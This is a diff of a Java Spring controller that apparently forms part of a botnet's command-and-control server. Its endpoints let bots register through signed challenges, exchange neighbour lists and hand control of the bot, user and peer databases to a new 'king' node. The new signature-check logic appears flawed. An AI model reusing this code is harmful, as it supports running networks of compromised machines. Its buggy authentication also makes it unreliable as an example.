@@ -1,6 +1,8 @@
 package cs.sii.controller;
 
 import java.io.IOException;
+import java.security.InvalidKeyException;
+import java.security.SignatureException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -9,11 +11,14 @@ import javax.servlet.http.HttpServletResponse;
 
 import org.apache.http.HttpStatus;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.scripting.bsh.BshScriptEvaluator;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.ResponseBody;
+
+import com.fasterxml.jackson.databind.cfg.SerializerFactoryConfig;
 
 import cs.sii.config.onLoad.Config;
 import cs.sii.control.command.Commando;
@@ -33,19 +38,19 @@ public class CommandController {
 	private Commando cmm;
 
 	////// CONTROLLER PER LA GESTIONE DEL VICINATO //////
-	
+
 	@RequestMapping(value = "/neighbours", method = RequestMethod.POST)
 	@ResponseBody
-	public byte[] getNeighbours(@RequestBody String data,HttpServletRequest req) {
+	public byte[] getNeighbours(@RequestBody String data, HttpServletRequest req) {
 		System.out.println("Richiesta di vicinato da " + req.getRemoteAddr());
 		return cmm.getNeighbours(data);
 	}
-	
+
 	@RequestMapping(value = "/neighbours/sync", method = RequestMethod.POST)
 	@ResponseBody
-	public byte[] syncNeighbours(@RequestBody List<String> data,HttpServletRequest req) {
+	public byte[] syncNeighbours(@RequestBody List<String> data, HttpServletRequest req) {
 		System.out.println("Richiesta di sincronizzazione del vicinato da " + req.getRemoteAddr());
-		
+
 		return cmm.syncNeightboursBot(data);
 	}
 
@@ -53,23 +58,42 @@ public class CommandController {
 
 	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
 	@ResponseBody
-	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error,HttpServletRequest req) throws IOException {
+	public Pairs<Long, Integer> botFirstAcces(@RequestBody String data, HttpServletResponse error,
+			HttpServletRequest req) throws IOException {
 		System.out.println("Richiesta di challenge ricevuta da " + req.getRemoteAddr());
-		System.out.println("1");
 		Pairs<Long, Integer> response = new Pairs<>();
+
+		String idBot;
+		Boolean flag = false;
 		if (configEngine.isCommandandconquerStatus()) {
-			response = cmm.authReq(idBot);
+			if (data != null) {
+				String[] msgs = data.split("<CS>");
+				idBot = msgs[0];
+				String idBotSign = msgs[1];
+				Bot b = cmm.getbServ().searchBotId(idBot);
+				if (b != null) {
+					try {
+						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,
+								cmm.getPki().rebuildPuK(b.getPubKey()));
+						if (!flag)
+							return response = new Pairs<Long, Integer>(new Long(-1), -1);
+					} catch (InvalidKeyException | SignatureException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				} else 
+					response = cmm.authReq(idBot);
+				}
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
-		System.out.println("2");
-
 		return response;
 	}
 
 	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
 	@ResponseBody
-	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,HttpServletRequest req) throws IOException {
+	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
+			HttpServletRequest req) throws IOException {
 		System.out.println("Richiesta con hmac ricevuta da " + req.getRemoteAddr());
 		String response = "";
 		if (configEngine.isCommandandconquerStatus()) {
@@ -106,30 +130,29 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/roles", method = RequestMethod.POST)
 	@ResponseBody
-	public List<Role> newKingRoles(@RequestBody String idBot,HttpServletRequest req) {
+	public List<Role> newKingRoles(@RequestBody String idBot, HttpServletRequest req) {
 		System.out.println("Richiesta RUOLI del database da " + req.getRemoteAddr());
-		idBot=cmm.getCrypto().decryptAES(idBot);
-		
-		System.out.println("id b"+ idBot);
-		System.out.println("id b2"+ cmm.getpServ().getNewKing());
-		System.out.println("id b3"+ cmm.getpServ().getNewKing().equals(idBot));
+		idBot = cmm.getCrypto().decryptAES(idBot);
 
-		
+		System.out.println("id b" + idBot);
+		System.out.println("id b2" + cmm.getpServ().getNewKing());
+		System.out.println("id b3" + cmm.getpServ().getNewKing().equals(idBot));
+
 		if (!cmm.getpServ().getNewKing().equals(idBot))
 			return null;
 		List<Role> response = new ArrayList<Role>();
 		// ruoli
 		List<Role> x = cmm.getrServ().findAll();
-		if(x!=null)
-		response.addAll(x);
+		if (x != null)
+			response.addAll(x);
 		return response;
 	}
 
 	@RequestMapping(value = "/newKing/bots", method = RequestMethod.POST)
 	@ResponseBody
-	public List<Bot> newKingBots(@RequestBody String idBot,HttpServletRequest req) {
+	public List<Bot> newKingBots(@RequestBody String idBot, HttpServletRequest req) {
 		System.out.println("Richiesta BOT del database da " + req.getRemoteAddr());
-		idBot=cmm.getCrypto().decryptAES(idBot);
+		idBot = cmm.getCrypto().decryptAES(idBot);
 		List<Bot> response = new ArrayList<Bot>();
 		// Bot
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -141,9 +164,9 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/users", method = RequestMethod.POST)
 	@ResponseBody
-	public List<User> newKingUsers(@RequestBody String idBot,HttpServletRequest req) {
+	public List<User> newKingUsers(@RequestBody String idBot, HttpServletRequest req) {
 		System.out.println("Richiesta USERS del database da " + req.getRemoteAddr());
-		idBot=cmm.getCrypto().decryptAES(idBot);
+		idBot = cmm.getCrypto().decryptAES(idBot);
 		List<User> response = new ArrayList<User>();
 		// User
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -154,9 +177,9 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/peers", method = RequestMethod.POST)
 	@ResponseBody
-	public List<String> newKingPeers(@RequestBody String idBot,HttpServletRequest req) {
+	public List<String> newKingPeers(@RequestBody String idBot, HttpServletRequest req) {
 		System.out.println("Richiesta PEERS del database da " + req.getRemoteAddr());
-		idBot=cmm.getCrypto().decryptAES(idBot);
+		idBot = cmm.getCrypto().decryptAES(idBot);
 		List<String> response = new ArrayList<String>();
 		// User
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -176,9 +199,9 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/ready", method = RequestMethod.POST)
 	@ResponseBody
-	public boolean newKingReady(@RequestBody String idBot,HttpServletRequest req) {
+	public boolean newKingReady(@RequestBody String idBot, HttpServletRequest req) {
 		System.out.println("Richiesta di conferma passaggio di poteri da" + req.getRemoteAddr());
-		idBot=cmm.getCrypto().decryptAES(idBot);
+		idBot = cmm.getCrypto().decryptAES(idBot);
 		// avvisa dns
 		if (!cmm.getpServ().getNewKing().equals(idBot))
 			return false;
